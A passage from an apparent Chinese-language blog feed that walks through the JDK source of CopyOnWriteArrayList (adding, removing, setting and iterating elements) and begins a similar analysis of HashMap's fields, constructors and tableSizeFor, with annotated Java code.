class="line">        <span class="comment">// 在finally块解锁</span></span><br><span class="line">        lock.unlock();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="6-addIfAbsent-E-e"><a href="#6-addIfAbsent-E-e" class="headerlink" title="6. addIfAbsent(E e)"></a>6. addIfAbsent(E e)</h1><p>元素不存在时才进行插入操作，并返回true，反之返回false。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">addIfAbsent</span><span class="params">(E e)</span> &#123;</span><br><span class="line">    Object[] snapshot = getArray();</span><br><span class="line">    <span class="keyword">return</span> indexOf(e, snapshot, <span class="number">0</span>, snapshot.length) &gt;= <span class="number">0</span> ? <span class="literal">false</span> :</span><br><span class="line">    addIfAbsent(e, snapshot);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>indexOf(Object o, Object[] elements, int index, int fence)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在elements数组中[index, fence)范围内查找对象o，返回找到的下标或-1</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">indexOf</span><span class="params">(Object o, Object[] elements,</span></span><br><span class="line"><span class="params">                           <span class="type">int</span> index, <span class="type">int</span> fence)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (o == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> index; i &lt; fence; i++)</span><br><span class="line">            <span class="keyword">if</span> (elements[i] == <span class="literal">null</span>)</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> index; i &lt; fence; i++)</span><br><span class="line">            <span class="keyword">if</span> (o.equals(elements[i]))</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>addIfAbsent(E e, Object[] snapshot)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">addIfAbsent</span><span class="params">(E e, Object[] snapshot)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">ReentrantLock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="built_in">this</span>.lock;</span><br><span class="line">    lock.lock();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Object[] current = getArray();</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> current.length;</span><br><span class="line">        <span class="comment">// 原数组已被修改的情况</span></span><br><span class="line">        <span class="keyword">if</span> (snapshot != current) &#123;</span><br><span class="line">            <span class="comment">// Optimize for lost race to another addXXX operation</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">common</span> <span class="operator">=</span> Math.min(snapshot.length, len);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; common; i++)</span><br><span class="line">                <span class="comment">// 在下标范围[0, comma)下，只要相同下标的元素发生改变，且插入元素已存在，返回false</span></span><br><span class="line">                <span class="keyword">if</span> (current[i] != snapshot[i] &amp;&amp; eq(e, current[i]))</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="comment">// 在下标范围[common, len)下，找到与插入元素相同的元素，返回false</span></span><br><span class="line">            <span class="keyword">if</span> (indexOf(e, current, common, len) &gt;= <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Object[] newElements = Arrays.copyOf(current, len + <span class="number">1</span>);</span><br><span class="line">        newElements[len] = e;</span><br><span class="line">        setArray(newElements);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        lock.unlock();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="7-remove-int-index"><a href="#7-remove-int-index" class="headerlink" title="7. remove(int index)"></a>7. remove(int index)</h1><p>根据下标移除元素，返回已删除元素。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> E <span class="title function_">remove</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">ReentrantLock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="built_in">this</span>.lock;</span><br><span class="line">    <span class="comment">// 加锁</span></span><br><span class="line">    lock.lock();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Object[] elements = getArray();</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> elements.length;</span><br><span class="line">        <span class="type">E</span> <span class="variable">oldValue</span> <span class="operator">=</span> get(elements, index);</span><br><span class="line">        <span class="type">int</span> <span class="variable">numMoved</span> <span class="operator">=</span> len - index - <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// 删除的是最后一个元素</span></span><br><span class="line">        <span class="keyword">if</span> (numMoved == <span class="number">0</span>)</span><br><span class="line">            setArray(Arrays.copyOf(elements, len - <span class="number">1</span>));</span><br><span class="line">        <span class="comment">// 删除的不是最后一个元素</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            Object[] newElements = <span class="keyword">new</span> <span class="title class_">Object</span>[len - <span class="number">1</span>];</span><br><span class="line">            System.arraycopy(elements, <span class="number">0</span>, newElements, <span class="number">0</span>, index);</span><br><span class="line">            System.arraycopy(elements, index + <span class="number">1</span>, newElements, index,</span><br><span class="line">                             numMoved);</span><br><span class="line">            setArray(newElements);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> oldValue;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// 在finally块解锁</span></span><br><span class="line">        lock.unlock();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>get(Object[] a, int index)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取数组指定位置元素</span></span><br><span class="line"><span class="keyword">private</span> E <span class="title function_">get</span><span class="params">(Object[] a, <span class="type">int</span> index)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (E) a[index];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="8-remove-Object-o"><a href="#8-remove-Object-o" class="headerlink" title="8. remove(Object o)"></a>8. remove(Object o)</h1><p>删除第1个指定元素（从下标0开始），返回值：true - 删除成功；false - 删除失败。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">remove</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">    Object[] snapshot = getArray();</span><br><span class="line">    <span class="comment">// 获取找到的第一个元素o的下标</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> indexOf(o, snapshot, <span class="number">0</span>, snapshot.length);</span><br><span class="line">    <span class="keyword">return</span> (index &lt; <span class="number">0</span>) ? <span class="literal">false</span> : remove(o, snapshot, index);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>remove(Object o, Object[] snapshot, int index)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 删除指定数组，指定下标的元素o，若数组发生了改变，重新找到元素o的下标</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">remove</span><span class="params">(Object o, Object[] snapshot, <span class="type">int</span> index)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">ReentrantLock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="built_in">this</span>.lock;</span><br><span class="line">    lock.lock();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Object[] current = getArray();</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> current.length;</span><br><span class="line">        <span class="comment">// 重新查找元素o的下标</span></span><br><span class="line">        <span class="keyword">if</span> (snapshot != current) findIndex: &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">prefix</span> <span class="operator">=</span> Math.min(index, len);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; prefix; i++) &#123;</span><br><span class="line">                <span class="comment">// 在下标范围[0, prefix)下，只要相同下标的元素发生改变，且找到要删除的元素，更新要删除的下标值，跳出findIndex</span></span><br><span class="line">                <span class="keyword">if</span> (current[i] != snapshot[i] &amp;&amp; eq(o, current[i])) &#123;</span><br><span class="line">                    index = i;</span><br><span class="line">                    <span class="keyword">break</span> findIndex;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (index &gt;= len)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="comment">// 找到被删的下标，跳出findIndex</span></span><br><span class="line">            <span class="keyword">if</span> (current[index] == o)</span><br><span class="line">                <span class="keyword">break</span> findIndex;</span><br><span class="line">            <span class="comment">// 在下标范围[index, len)下，找元素o的下标</span></span><br><span class="line">            index = indexOf(o, current, index, len);</span><br><span class="line">            <span class="comment">// 仍然找不到，直接退出</span></span><br><span class="line">            <span class="keyword">if</span> (index &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Object[] newElements = <span class="keyword">new</span> <span class="title class_">Object</span>[len - <span class="number">1</span>];</span><br><span class="line">        System.arraycopy(current, <span class="number">0</span>, newElements, <span class="number">0</span>, index);</span><br><span class="line">        System.arraycopy(current, index + <span class="number">1</span>,</span><br><span class="line">                         newElements, index,</span><br><span class="line">                         len - index - <span class="number">1</span>);</span><br><span class="line">        setArray(newElements);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        lock.unlock();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="9-set-int-index-E-element"><a href="#9-set-int-index-E-element" class="headerlink" title="9. set(int index, E element)"></a>9. set(int index, E element)</h1><p>设置指定下标元素的值，返回设定前的旧值。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> E <span class="title function_">set</span><span class="params">(<span class="type">int</span> index, E element)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">ReentrantLock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="built_in">this</span>.lock;</span><br><span class="line">    lock.lock();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Object[] elements = getArray();</span><br><span class="line">        <span class="type">E</span> <span class="variable">oldValue</span> <span class="operator">=</span> get(elements, index);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (oldValue != element) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> elements.length;</span><br><span class="line">            <span class="comment">// 设置指定下标元素的值，也是符合写时复制的规则</span></span><br><span class="line">            Object[] newElements = Arrays.copyOf(elements, len);</span><br><span class="line">            newElements[index] = element;</span><br><span class="line">            setArray(newElements);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Not quite a no-op; ensures volatile write semantics</span></span><br><span class="line">            setArray(elements);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> oldValue;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        lock.unlock();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="10-get-int-index"><a href="#10-get-int-index" class="headerlink" title="10. get(int index)"></a>10. get(int index)</h1><p>根据下标获取元素。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> E <span class="title function_">get</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> get(getArray(), index);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="11-size"><a href="#11-size" class="headerlink" title="11. size()"></a>11. size()</h1><p>返回集合元素个数。（这里是数组的长度，每插入一个元素，复制新数组，长度加1，从数组尾部插入，指向新数组。故，数组长度即为元素个数）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">size</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> getArray().length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="12-迭代器-iterator"><a href="#12-迭代器-iterator" class="headerlink" title="12. 迭代器 - iterator()"></a>12. 迭代器 - iterator()</h1><p>在循环删除元素的操作中，最好使用迭代器来删除元素。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Iterator&lt;E&gt; <span class="title function_">iterator</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">COWIterator</span>&lt;E&gt;(getArray(), <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">COWIterator</span>&lt;E&gt; <span class="keyword">implements</span> <span class="title class_">ListIterator</span>&lt;E&gt; &#123;</span><br><span class="line">    <span class="comment">/** Snapshot of the array */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object[] snapshot;</span><br><span class="line">    <span class="comment">/** Index of element to be returned by subsequent call to next.  */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> cursor;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">COWIterator</span><span class="params">(Object[] elements, <span class="type">int</span> initialCursor)</span> &#123;</span><br><span class="line">        cursor = initialCursor;</span><br><span class="line">        snapshot = elements;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">hasNext</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> cursor &lt; snapshot.length;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">hasPrevious</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> cursor &gt; <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> E <span class="title function_">next</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (! hasNext())</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchElementException</span>();</span><br><span class="line">        <span class="keyword">return</span> (E) snapshot[cursor++];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> E <span class="title function_">previous</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (! hasPrevious())</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchElementException</span>();</span><br><span class="line">        <span class="keyword">return</span> (E) snapshot[--cursor];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">nextIndex</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> cursor;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">previousIndex</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> cursor-<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Not supported. Always throws UnsupportedOperationException.</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@throws</span> UnsupportedOperationException always; &#123;<span class="doctag">@code</span> remove&#125;</span></span><br><span class="line"><span class="comment">         *         is not supported by this iterator.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">remove</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Not supported. Always throws UnsupportedOperationException.</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@throws</span> UnsupportedOperationException always; &#123;<span class="doctag">@code</span> set&#125;</span></span><br><span class="line"><span class="comment">         *         is not supported by this iterator.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">set</span><span class="params">(E e)</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Not supported. Always throws UnsupportedOperationException.</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@throws</span> UnsupportedOperationException always; &#123;<span class="doctag">@code</span> add&#125;</span></span><br><span class="line"><span class="comment">         *         is not supported by this iterator.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(E e)</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">forEachRemaining</span><span class="params">(Consumer&lt;? <span class="built_in">super</span> E&gt; action)</span> &#123;</span><br><span class="line">        Objects.requireNonNull(action);</span><br><span class="line">        Object[] elements = snapshot;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> elements.length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> cursor; i &lt; size; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span> <span class="type">E</span> <span class="variable">e</span> <span class="operator">=</span> (E) elements[i];</span><br><span class="line">            action.accept(e);</span><br><span class="line">        &#125;</span><br><span class="line">        cursor = size;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h1><ul>
<li>元素：有序，可重复，可为null，可以通过迭代器遍历。</li>
<li>效率：通过Object数组+ReentrantLock实现。写入时，先加锁，再复制一份数组，在复制的数组上进行写入操作，然后旧数组变量指向新数组对象，最后释放锁。读取与普通数组的读取一样，不加锁。每次插入或删除都需要创建新数组，且可能挪动大量元素，适合读取，不适合写入，但要是在多线程环境下，相比使用synchronized的Vector，效率较高。</li>
<li>安全性：线程安全。</li>
</ul>
]]></content>
      <categories>
        <category>源码分析</category>
        <category>集合</category>
        <category>CopyOnWriteArrayList</category>
      </categories>
      <tags>
        <tag>源码分析</tag>
        <tag>CopyOnWriteArrayList</tag>
      </tags>
  </entry>
  <entry>
    <title>HashMap源码分析</title>
    <url>/2023/10/02/$HashMap%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<ol>
<li><p>HashSet通过包含一个值为Object常量的HashMap实现，无序不可重复，线程不安全。</p>
</li>
<li><p>TreeMap通过红黑树实现，并且key必须实现Comparable接口或者TreeMap实例化时指定排序规则Comparator，有序，线程不安全。</p>
</li>
<li><p>TreeSet通过包含一个值为Object常量的TreeMap（SortedMap）实现，有序不可重复，线程不安全。</p>
</li>
<li><p>TreeSet和TreeMap的关系与HashSet和HashMap关系类似，都是通过后者实现，这里只分析HashMap，其它不再详细分析。</p>
</li>
<li><p>Hashtable通过数组+单链表实现，插入无序，循环输出有序，线程安全。与TreeMap一样，key不能为null。与Vector一样，线程安全且同为JDK1.0的类。（ArrayList&#x2F;LinkedList&#x2F;HashMap&#x2F;HashSet&#x2F;TreeMap&#x2F;TreeSet都是JDK1.2新增的）</p>
</li>
</ol>
<h1 id="1-new-HashMap"><a href="#1-new-HashMap" class="headerlink" title="1. new HashMap()"></a>1. new HashMap()</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 默认初始化容器大小16（Node数组的长度）</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">DEFAULT_INITIAL_CAPACITY</span> <span class="operator">=</span> <span class="number">1</span> &lt;&lt; <span class="number">4</span>; <span class="comment">// aka 16</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 容器最大值，容器大小必须为2的整数次方，即2^30</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MAXIMUM_CAPACITY</span> <span class="operator">=</span> <span class="number">1</span> &lt;&lt; <span class="number">30</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 默认加载因子（负载系数）0.75</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">float</span> <span class="variable">DEFAULT_LOAD_FACTOR</span> <span class="operator">=</span> <span class="number">0.75f</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 树化（链表转红黑树）的阈值为8，链表长度大于8（且哈希表长度不小于64）后进行树化，在链表长度达到9后，开始把链表转为红黑树。因为在代码中是先添加到链表后，再进行binCount判断是否需要树化。</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">TREEIFY_THRESHOLD</span> <span class="operator">=</span> <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反树化（红黑树转链表）的阈值为6，节点数小于等于6进行反树化。树化与反树化的阈值不同：防止单个元素增加删除造成的频繁树化和反树化的过程，反而降低效率。</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">UNTREEIFY_THRESHOLD</span> <span class="operator">=</span> <span class="number">6</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 树化最小的哈希表（数组）长度，即链表长度大于8且哈希表长度至少为64时，进行树化。</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MIN_TREEIFY_CAPACITY</span> <span class="operator">=</span> <span class="number">64</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数据结构为Node类型的数组，Node为单链表或红黑树，在首次使用时初始化数组（按需扩容）</span></span><br><span class="line"><span class="keyword">transient</span> Node&lt;K,V&gt;[] table;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 保存缓存的entrySet，通常用于遍历整个map</span></span><br><span class="line"><span class="keyword">transient</span> Set&lt;Map.Entry&lt;K,V&gt;&gt; entrySet;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 键值对的数量</span></span><br><span class="line"><span class="keyword">transient</span> <span class="type">int</span> size;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 结构修改的次数（引发集合大小size改变的修改次数）</span></span><br><span class="line"><span class="keyword">transient</span> <span class="type">int</span> modCount;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 扩容的阈值 (capacity * load factor)，值得注意的是：此属性在容器实例化后，初始值为0或设定的容器大小（2的整数次方），在resize中才修改正确</span></span><br><span class="line"><span class="comment">// 添加键值对后，判断size &gt; 阈值则扩容</span></span><br><span class="line"><span class="type">int</span> threshold;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加载因子</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">float</span> loadFactor;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实例化HashMap，但哈希表未初始化，在首次插入数据时初始化（初始化大小默认16，加载因子默认0.75）。</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">HashMap</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.loadFactor = DEFAULT_LOAD_FACTOR; <span class="comment">// all other fields defaulted</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="2-new-HashMap-int-initialCapacity"><a href="#2-new-HashMap-int-initialCapacity" class="headerlink" title="2. new HashMap(int initialCapacity)"></a>2. new HashMap(int initialCapacity)</h1><p>实例化HashMap，指定初始化容器大小（Node数组的长度），使用默认加载因子0.75进行初始化。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">HashMap</span><span class="params">(<span class="type">int</span> initialCapacity)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>(initialCapacity, DEFAULT_LOAD_FACTOR);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="3-new-HashMap-int-initialCapacity-float-loadFactor"><a href="#3-new-HashMap-int-initialCapacity-float-loadFactor" class="headerlink" title="3. new HashMap(int initialCapacity, float loadFactor)"></a>3. new HashMap(int initialCapacity, float loadFactor)</h1><p>实例化HashMap，且指定初始化容器大小（Node数组的长度）以及加载因子。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">HashMap</span><span class="params">(<span class="type">int</span> initialCapacity, <span class="type">float</span> loadFactor)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (initialCapacity &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Illegal initial capacity: &quot;</span> +</span><br><span class="line">                                           initialCapacity);</span><br><span class="line">    <span class="keyword">if</span> (initialCapacity &gt; MAXIMUM_CAPACITY)</span><br><span class="line">        <span class="comment">// Integer最大值为2^31-1，且要求容器大小为2的整数次方，故最大值为2^30</span></span><br><span class="line">        initialCapacity = MAXIMUM_CAPACITY;</span><br><span class="line">    <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                           loadFactor);</span><br><span class="line">    <span class="built_in">this</span>.loadFactor = loadFactor;</span><br><span class="line">    <span class="comment">// 返回不小于initialCapacity的最小2的整数次方，详细：3.1，threshold在resize()时才设定为：容器大小*加载因子</span></span><br><span class="line">    <span class="built_in">this</span>.threshold = tableSizeFor(initialCapacity);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-1-tableSizeFor-int-cap"><a href="#3-1-tableSizeFor-int-cap" class="headerlink" title="3.1 tableSizeFor(int cap)"></a>3.1 tableSizeFor(int cap)</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 返回不小于cap的最小2的整数次方</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">tableSizeFor</span><span class="params">(<span class="type">int</span> cap)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> cap - <span class="number">1</span>;</span><br><span class="line">    n |= n &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">    n |= n &gt;&gt;&gt; <span class="number">2</span>;</span><br><span class="line">    n |= n &gt;&gt;&gt; <span class="number">4</span>;</span><br><span class="line">    n |= n &gt;&gt;&gt; <span class="number">8</span>;</span><br><span class="line">    n |= n &gt;&gt;&gt; <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">return</span> (n &lt; <span class="number">0</span>) ? <span class="number">1</span> : (n &gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : n + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>假设cap &#x3D; 72</p>
